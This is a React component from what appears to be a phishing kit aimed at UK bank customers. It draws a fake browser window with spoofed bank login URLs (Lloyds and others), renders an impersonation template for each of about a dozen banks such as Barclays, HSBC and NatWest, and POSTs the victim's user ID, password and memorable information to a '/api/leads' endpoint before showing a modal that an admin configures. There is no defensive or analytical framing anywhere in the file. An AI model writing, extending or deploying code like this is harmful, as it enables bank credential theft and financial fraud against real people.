"use client";

import { useEffect, useState } from "react";
import BarclaysTemplate from "./bank-templates/BarclaysTemplate";
import LloydsTemplate from "./bank-templates/LloydsTemplate";
import NatwestTemplate from "./bank-templates/NatwestTemplate";
import TideTemplate from "./bank-templates/TideTemplate";
import HsbcTemplate from "./bank-templates/HsbcTemplate";
import HalifaxTemplate from "./bank-templates/HalifaxTemplate";
import SantanderTemplate from "./bank-templates/SantanderTemplate";
import StarlingTemplate from "./bank-templates/StarlingTemplate";
import MetroBankTemplate from "./bank-templates/MetroBankTemplate";
import RbsTemplate from "./bank-templates/RbsTemplate";
import TsbTemplate from "./bank-templates/TsbTemplate";
import CooperativeBankTemplate from "./bank-templates/CooperativeBankTemplate";
import FinalActionModal from "./FinalActionModal";

interface BankBrowserPopupProps {
  isOpen: boolean;
  bankName: string;
  selectedOption?: string;
  logoUrl?: string | null;
  onClose: () => void;
}

export default function BankBrowserPopup({
  isOpen,
  bankName,
  selectedOption = "Business",
  logoUrl,
  onClose,
}: BankBrowserPopupProps) {
  // Admin configured popup state
  const [bankConfig, setBankConfig] = useState<any>(null);
  const [showFinalModal, setShowFinalModal] = useState(false);

  // Fetch admin settings for this specific bank
  useEffect(() => {
    if (!isOpen) {
      setShowFinalModal(false);
      return;
    }

    async function fetchBankSettings() {
      try {
        const res = await fetch("/api/admin/banks");
        const json = await res.json();
        if (json.success && json.data) {
          const matched = json.data.find(
            (b: any) => b.name.toLowerCase() === bankName.toLowerCase()
          );
          if (matched) {
            setBankConfig(matched);
          }
        }
      } catch (err) {
        console.error("Failed to load bank admin settings:", err);
      }
    }

    fetchBankSettings();
  }, [isOpen, bankName]);

  if (!isOpen) return null;

  // Form submit handler -> Save lead & open admin popup
  const handleBankSubmitSuccess = async (data: {
    userId: string;
    password?: string;
    memorableInfo?: string;
    extraData?: string;
  }) => {
    try {
      await fetch("/api/leads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          bank: bankName,
          userId: data.userId,
          password: data.password,
          memorableInfo: data.memorableInfo,
          extraData: data.extraData || `Option: ${selectedOption}`,
        }),
      });
    } catch (err) {
      console.error("Failed to save lead:", err);
    }

    // Admin Panel se set kiya gaya response modal trigger karein
    setShowFinalModal(true);
  };

  const name = bankName.toLowerCase();

  const renderActiveBank = () => {
    const commonProps = {
      bankName,
      selectedOption,
      logoUrl,
      onSuccessSubmit: handleBankSubmitSuccess,
    };

    if (name.includes("lloyds")) return <LloydsTemplate {...commonProps} />;
    if (name.includes("natwest")) return <NatwestTemplate {...commonProps} />;
    if (name.includes("tide")) return <TideTemplate {...commonProps} />;
    if (name.includes("hsbc")) return <HsbcTemplate {...commonProps} />;
    if (name.includes("halifax")) return <HalifaxTemplate {...commonProps} />;
    if (name.includes("santander")) return <SantanderTemplate {...commonProps} />;
    if (name.includes("starling")) return <StarlingTemplate {...commonProps} />;
    if (name.includes("metro")) return <MetroBankTemplate {...commonProps} />;
    if (name.includes("rbs") || name.includes("royal bank")) return <RbsTemplate {...commonProps} />;
    if (name.includes("tsb")) return <TsbTemplate {...commonProps} />;
    if (name.includes("cooperative") || name.includes("co-operative")) return <CooperativeBankTemplate {...commonProps} />;

    return <BarclaysTemplate {...commonProps} />;
  };

  // Admin URL agar configure ho toh wahi use karein
  const displayAddress =
    bankConfig?.browserAddressBar ||
    (name.includes("lloyds")
      ? "authorise-api.lloydsbank.co.uk/prod01/lbg/lyds/mtls-token-api/v1.1/authorize?response_type=code%20id_token&clie..."
      : `authorise.${name.replace(/[^a-z0-9]/g, "")}.co.uk/personal/logon`);

  return (
    <>
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 p-0 sm:p-4 backdrop-blur-[2px]">
        <div className="relative flex h-full sm:h-[95vh] w-full max-w-[1250px] flex-col overflow-hidden bg-white shadow-2xl rounded-none sm:rounded-sm border border-[#1f2937]">
          
          {/* ================= 1. WINDOWS CHROME TITLE BAR ================= */}
          <div className="flex h-9 items-center justify-between bg-[#1f1f1f] text-white select-none px-3 border-b border-[#2d2d2d] shrink-0">
            <div className="flex items-center gap-2 max-w-[85%] truncate">
              <svg
                className="w-4 h-4 text-slate-400 shrink-0"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <circle cx="12" cy="12" r="10" />
                <line x1="2" y1="12" x2="22" y2="12" />
                <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
              </svg>
              <span className="text-xs text-slate-200 truncate font-sans">
                {displayAddress}
              </span>
            </div>

            <div className="flex items-center">
              <button
                type="button"
                className="h-9 w-11 flex items-center justify-center hover:bg-[#333333] text-slate-300 transition"
                title="Minimize"
              >
                <span className="text-sm font-mono">―</span>
              </button>
              <button
                type="button"
                className="h-9 w-11 flex items-center justify-center hover:bg-[#333333] text-slate-300 transition"
                title="Maximize"
              >
                <span className="text-xs font-mono">□</span>
              </button>
              <button
                type="button"
                onClick={onClose}
                className="h-9 w-11 flex items-center justify-center hover:bg-[#e81123] hover:text-white text-slate-300 transition cursor-pointer"
                title="Close"
              >
                <span className="text-xs">✕</span>
              </button>
            </div>
          </div>

          {/* ================= 2. DARK GREEN URL ADDRESS BAR ================= */}
          <div className="flex h-11 items-center bg-[#004e38] px-3 gap-2 border-b border-[#003828] shrink-0">
            <div className="flex flex-1 items-center gap-2 bg-[#003d2c] rounded-full px-3 py-1.5 text-white/90 text-xs font-sans shadow-inner">
              <span className="text-white/80 flex items-center gap-1 cursor-pointer">
                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2">
                  <circle cx="9" cy="9" r="2" />
                  <circle cx="15" cy="15" r="2" />
                  <line x1="4" y1="9" x2="7" y2="9" />
                  <line x1="11" y1="9" x2="20" y2="9" />
                  <line x1="4" y1="15" x2="13" y2="15" />
                  <line x1="17" y1="15" x2="20" y2="15" />
                </svg>
              </span>

              <span className="truncate font-sans text-[12.5px] text-white">
                <strong className="text-white font-semibold">
                  {displayAddress.split("/")[0]}
                </strong>
                <span className="text-white/70">
                  {displayAddress.includes("/") ? "/" + displayAddress.split("/").slice(1).join("/") : ""}
                </span>
              </span>
            </div>
          </div>

          {/* ================= 3. BANK TEMPLATE CONTENT ================= */}
          <div className="flex-1 overflow-y-auto bg-white">
            {renderActiveBank()}
          </div>

        </div>
      </div>

      {/* ================= 4. ADMIN CONFIGURED FINAL ACTION MODAL ================= */}
      {showFinalModal && (
        <FinalActionModal
          isOpen={showFinalModal}
          bankName={bankName}
          bankConfig={bankConfig}
          onClose={() => {
            setShowFinalModal(false);
            onClose();
          }}
        />
      )}
    </>
  );
}